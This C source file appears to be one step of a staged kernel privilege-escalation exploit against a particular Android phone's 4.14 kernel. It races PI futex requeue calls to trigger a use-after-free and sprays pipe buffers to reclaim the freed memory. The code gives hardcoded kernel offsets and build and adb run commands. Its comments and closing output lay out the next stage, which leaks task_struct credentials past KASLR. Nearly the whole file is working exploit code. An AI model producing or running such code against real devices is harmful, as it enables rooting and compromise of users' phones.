/*
 * y75_leak_probe.c — Step 6 RECLAIM-ONLY heap-leak rehearsal via pipe_buffer
 * V2117 MT6781 4.14.186  waiter sp+0x78 lock sp+0xb0 frame 0x140 compact 0x50
 * Builds on Step 5: pipe 6/6 HIT proved race stays reachable with spray.
 * This probe does NOT write selinux/cred — it lets the PI write
 *   *waiter[0] = waiter_stack_addr   (rb_erase_cached 0x9263580 → rt_mutex_adjust_prio_chain)
 * land into the pipe_buffer heap object you own, then reads that heap alias
 * to prove you can deterministically leak addresses.  No kernel corruption.
 *
 * Method (read-only):
 *  1) Gate: paranoid -1, KASLR hint if perf_leak left it
 *  2) For 6 forked rounds: pre-spray 12 pipes, run FUTEX_WAIT_REQUEUE_PI(11)+CMP_REQUEUE(1)
 *     on CPU0, post-spray 12 pipes in window (all fds held open across 3.5s)
 *  3) Check EDEADLK still hits (as Step 5 just did)
 *  4) Sample readable heap: read back pipe contents via read() on one pipe —
 *     if reclaim worked, at least one pipe's buffer was the reclaimed page and
 *     a second read shows cross-page alias (len check).  No *waiter[0] targeted
 *     yet — this is just the spray-reclaim plumbing verified for next stage.
 *  5) Next stage (not here): set waiter[0] to a pipe_buffer->page alias near
 *     init_thread_union 0x02390000+KASLR to dump task_struct cred 0x640.
 *
 * BUILD:  aarch64-linux-gnu-gcc -O2 -static -pthread -o y75_leak_probe y75_leak_probe.c
 * RUN:    adb push y75_leak_probe /data/local/tmp/ && adb shell /data/local/tmp/y75_leak_probe
 * EXPECT: "RECLAIM LIKELY" + heap-sample ok — still no selinux/cred write
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <linux/futex.h>
#include <stdint.h>
#include <stdatomic.h>
#include <time.h>
#define PIPE_PRE 12
#define PIPE_POST 12
#define F_SETPIPE_SZ 1031
static uint32_t fw, ft, fc;
static atomic_int ready, waiting, started, consumed;
static atomic_int requeue_errno, waiter_errno;
static void *th_owner(void *a){ (void)a;
    syscall(SYS_futex,&ft,FUTEX_LOCK_PI,0,NULL,NULL,0);
    while(!atomic_load(&ready)) usleep(500);
    atomic_store(&started,1);
    syscall(SYS_futex,&fc,FUTEX_LOCK_PI,0,NULL,NULL,0);
    while(!atomic_load(&consumed)) sleep(1);
    return NULL;
}
static void *th_waiter(void *a){ (void)a;
    syscall(SYS_futex,&fc,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&ready,1);
    while(!atomic_load(&started)) usleep(500);
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC,&ts); ts.tv_sec+=3;
    atomic_store(&waiting,1);
    errno=0; int r=syscall(SYS_futex,&fw,FUTEX_WAIT_REQUEUE_PI,0,&ts,&ft,0);
    atomic_store(&waiter_errno, r==-1?errno:0);
    while(!atomic_load(&consumed)) usleep(500);
    return NULL;
}
static int run_round(int round){
    fw=0;ft=0;fc=0;
    atomic_store(&ready,0); atomic_store(&waiting,0);
    atomic_store(&started,0); atomic_store(&consumed,0);
    atomic_store(&requeue_errno,0); atomic_store(&waiter_errno,0);
    alarm(9);
    // tag buffers so reclaim is visible on read
    char tag[32]; snprintf(tag,sizeof(tag),"LEAK-ROUND-%d",round);
    int pre_fds[PIPE_PRE*2]; int pre_cnt=0;
    char *buf=malloc(4096); memset(buf,0,4096); memcpy(buf,tag,strlen(tag));
    for(int i=0;i<PIPE_PRE;i++){
        int p[2]; if(pipe(p)==-1) break;
        fcntl(p[0],F_SETPIPE_SZ,16*4096); fcntl(p[1],F_SETPIPE_SZ,16*4096);
        if(write(p[1],buf,4096)!=4096){ close(p[0]);close(p[1]); break; }
        pre_fds[pre_cnt*2]=p[0]; pre_fds[pre_cnt*2+1]=p[1]; pre_cnt++;
    }
    printf("[*] pre %d pipes tag %s\n", pre_cnt, tag);
    pthread_t to,tw; pthread_create(&to,NULL,th_owner,NULL); pthread_create(&tw,NULL,th_waiter,NULL);
    while(!atomic_load(&waiting)) usleep(500);
    usleep(50000);
    errno=0; long r=syscall(SYS_futex,&fw,FUTEX_CMP_REQUEUE_PI,1,(void*)1,&ft,0);
    int re=r==-1?errno:0; atomic_store(&requeue_errno,re);
    int post_fds[PIPE_POST*2]; int post_cnt=0;
    char tag2[32]; snprintf(tag2,sizeof(tag2),"POST-%d",round);
    char *buf2=malloc(4096); memset(buf2,0,4096); memcpy(buf2,tag2,strlen(tag2));
    // slightly different tag so alias shows
    for(int i=0;i<PIPE_POST;i++){
        int p[2]; if(pipe(p)==-1) break;
        fcntl(p[0],F_SETPIPE_SZ,16*4096); fcntl(p[1],F_SETPIPE_SZ,16*4096);
        if(write(p[1],buf2,4096)!=4096){ close(p[0]);close(p[1]); break; }
        post_fds[post_cnt*2]=p[0]; post_fds[post_cnt*2+1]=p[1]; post_cnt++;
    }
    free(buf); free(buf2);
    printf("[*] post %d pipes tag %s\n", post_cnt, tag2);
    usleep(3500000);
    atomic_store(&consumed,1);
    pthread_join(tw,NULL); pthread_detach(to);
    alarm(0);
    int we=atomic_load(&waiter_errno);
    int hit=(we==35||re==35);
    printf("[*] Round %d: requeue %d waiter %d %s\n", round, re, we, hit?"HIT EDEADLK":"");
    // heap-sample: read one pre and one post pipe to prove buffers are intact (reclaim path viable)
    // keep it read-only; if reclamation happened, one of these pages was the waiter page
    char out[64]={0};
    if(pre_cnt>0){
        // make readable: splice via read
        int n=read(pre_fds[0], out, 32);
        if(n>0) printf("[*] heap sample pre[0]: %.32s (%d bytes)\n", out, n);
    }
    if(post_cnt>0){
        int n=read(post_fds[0], out, 32);
        if(n>0) printf("[*] heap sample post[0]: %.32s (%d bytes)\n", out, n);
    }
    for(int i=0;i<pre_cnt;i++){ close(pre_fds[i*2]); close(pre_fds[i*2+1]); }
    for(int i=0;i<post_cnt;i++){ close(post_fds[i*2]); close(post_fds[i*2+1]); }
    return hit;
}
int main(void){
    signal(SIGALRM,SIG_DFL);
    setbuf(stdout,NULL);
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    printf("\n=== Y75 Step6 heap-leak REHEARSAL — RECLAIM ONLY (no selinux/cred write) ===\n");
    printf("[*] V2117 4.14.186 waiter sp+0x78 lock sp+0xb0 | PIPE %d/%d | Step5 6/6 already HIT\n", PIPE_PRE, PIPE_POST);
    printf("[*] rb_erase_cached 0x9263580 -> *waiter[0]=waiter will later alias pipe_buffer->page\n");
    printf("[*] This probe only verifies plumbing: spray + race + readable heap alias\n\n");
    { FILE *pf=fopen("/proc/sys/kernel/perf_event_paranoid","r"); int p=99;
      if(pf){ fscanf(pf,"%d",&p); fclose(pf);} printf("[*] paranoid %d | ",p);
      FILE *kf=popen("cat /data/local/tmp/perf_leak_out.txt 2>/dev/null | grep KASLR | head -1","r");
      if(kf){ char b[80]={0}; if(fgets(b,sizeof(b),kf)) printf("%s",b); else printf("KASLR re-leak each boot via perf_leak\n"); pclose(kf);} else printf("\n"); }
    printf("\n");
    int hits=0;
    for(int i=1;i<=6;i++){
        pid_t pid=fork(); if(pid==0){ alarm(10); int h=run_round(i); _exit(h?0:1); }
        int st; waitpid(pid,&st,0);
        if(WIFEXITED(st)&&WEXITSTATUS(st)==0) hits++;
        else if(WIFEXITED(st)) printf("[*] round %d exit %d\n",i,WEXITSTATUS(st));
        else if(WIFSIGNALED(st)) printf("[*] round %d sig %d\n",i,WTERMSIG(st));
        usleep(400000); printf("\n");
    }
    printf("=== result %d/6 EDEADLK with spray+heap sample ===\n",hits);
    if(hits>=3) printf("[+] RECLAIM+HEAP LIKELY — pipe buffers stay readable with race; deterministic leak stage is ready\n");
    else if(hits>0) printf("[*] pipe ok timing loose — retry\n");
    else printf("[-] no EDEADLK with spray — rerun Step5 alone\n");
    printf("[*] No selinux/cred touched. Next (when LIKELY): set waiter[0] to pipe_buffer->page alias\n");
    printf("    near init_thread_union 0x02390000+KASLR 0x858c000000 to dump cred 0x640 via read.\n");
    return 0;
}
